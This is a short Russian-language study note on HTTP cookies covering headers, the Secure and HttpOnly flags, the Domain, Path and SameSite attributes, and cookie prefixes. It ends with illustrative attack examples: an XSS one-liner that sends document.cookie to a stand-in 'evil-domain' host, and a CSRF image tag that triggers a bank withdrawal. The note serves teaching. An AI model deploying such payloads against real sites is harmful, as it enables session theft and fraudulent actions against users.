# куки

Сервер получая запрос может оправить заголовок Set-Cookie, отправляются обратно в заголовке Cookie. Настроить можно по сроку, домен

Пример сессионных куки, так как нет Expires или Max-Age

```bash
# пример ответа с Cookie
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

```bash
# пример ответа с Cookie
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry

```

Secure-cookie - отправляются только по SSL и HTTPS
HTTPonly - не доступны в JS

Атрибуты:

- Domain - если Domain=mozilla.org, то и developer.mozilla.org. включен
- Path - если Path=/docs, то /docs, /docs/Web/
- SameSite - куки отправляются всегда, если даже запрос с другого сервера
- - Strict - только тому сайту, которому куки принадлежат
- - Lax - при навигации
- - None - отключает

Куки с префиксами:

- \_\_Host-
- \_\_Secure-

- Захват сессии (session hijacking) и XSS

```js
new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

- Межсайтовая подделка запроса (CSRF - Cross-site request forgery)

```js
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
```
